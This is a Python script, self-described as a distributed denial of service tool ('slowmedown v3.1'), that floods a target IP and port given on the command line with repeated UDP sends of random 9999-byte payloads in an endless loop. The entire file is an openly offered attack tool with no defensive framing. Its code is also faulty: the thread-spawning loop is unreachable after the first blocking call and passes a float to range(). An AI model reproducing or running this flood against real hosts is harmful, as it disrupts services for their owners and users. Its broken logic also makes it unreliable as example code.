# a distributed denial of service tool, highly dangerous when misused...
import sys
import socket
from threading import Thread
import time
import random
import os

s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) # creates a socket object

# clear output screen
if os.name == 'nt':
	os.system('cls')
else:
	os.system('clear')

# accept command
if len(sys.argv) < 5:
	output = '''
       [slowmedown v3.1] Usage - slowmedown.py -start (Target I.P) -p (Port)
	'''
	print(output)
	exit(0)

# set data for future use
Time = time.time()
threads = 100 # set the thread range

s.connect((sys.argv[2], int(sys.argv[4]))) # connect to target machine

def slowmedown():
  
   pkt = 0
   if sys.argv[1] == '-start':
   	pass
   else:
   	sys.exit()

   if sys.argv[3] == '-p':
   	pass
   else:
   	sys.exit()
   byte = random._urandom(9999) # bytes
   while True:
   	        # keep sending and sending and sending
    		s.send(byte)
    		s.send(byte)
    		s.send(byte)
    		s.send(byte)
    		s.send(byte)
    		s.send(byte)
    		s.send(byte)
    		s.send(byte)
    		s.send(byte)
    		s.send(byte)
    		s.send(byte)
    		s.send(byte)
    		s.send(byte)
    		s.send(byte)
    		s.send(byte)
    		s.send(byte)
    		s.send(byte)
    		s.send(byte)
    		s.send(byte)
    		s.send(byte)
    		s.send(byte)
    		s.send(byte)
    		s.send(byte)
    		s.send(byte)
    		s.send(byte)
    		s.send(byte)
    		s.send(byte)
    		s.send(byte)
    		s.send(byte)
    		s.send(byte)
    		s.send(byte)
    		s.send(byte)
    		s.send(byte)
    		s.send(byte)
    		s.send(byte)
    		s.send(byte)
    		s.send(byte)
    		s.send(byte)
    		s.send(byte)
    		s.send(byte)
    		s.send(byte)
    		s.send(byte)
    		s.send(byte)
    		s.send(byte)
    		s.send(byte)
    		s.send(byte)
    		s.send(byte)
    		s.send(byte)
    		s.send(byte)
    		s.send(byte)
    		s.send(byte)
    		s.send(byte)
    		s.send(byte)
    		s.send(byte)
    		s.send(byte)
    		s.send(byte)
    		s.send(byte)
    		s.send(byte)
    		s.send(byte)
    		s.send(byte)
    		s.send(byte)
    		s.send(byte)
    		s.send(byte)
    		s.send(byte)
    		s.send(byte)
    		s.send(byte)
    		s.send(byte)
    		s.send(byte)
    		s.send(byte)
    		s.send(byte)
    		s.send(byte)
    		s.send(byte)
    		s.send(byte)
    		s.send(byte)
    		s.send(byte)
    		s.send(byte)
    		s.send(byte)
    		s.send(byte)
    		s.send(byte)
    		s.send(byte)
    		s.send(byte)
    		s.send(byte)
    		s.send(byte)
    		s.send(byte)
    		s.send(byte)
    		s.send(byte)
    		s.send(byte)
    		s.send(byte)
    		s.send(byte)
    		s.send(byte)
    		s.send(byte)
    		s.send(byte)
    		s.send(byte)
    		s.send(byte)
    		s.send(byte)
    		s.send(byte)
    		s.send(byte)
    		s.send(byte)
    		s.send(byte)
    		s.send(byte)
    		s.send(byte)
    		s.send(byte)
    		s.send(byte)
    		s.send(byte)
    		s.send(byte)
    		s.send(byte)
    		s.send(byte)
    		s.send(byte)
    		s.send(byte)
    		s.send(byte)
    		s.send(byte)
    		s.send(byte)
    		s.send(byte)
    		pkt+=1
    		if pkt == 1:
    			print('\n[-] slowmedown started. sent {} packet'.format(pkt))
    			time.sleep(random.uniform(3.5, 3.5))
    		else:
    			print('\n[-] slowmedown started. sent {} packets'.format(pkt))
    			time.sleep(random.uniform(3.5, 3.5))

slowmedown()

for _ in range(Time*threads):
    	th = Thread(target=slowmedown).start()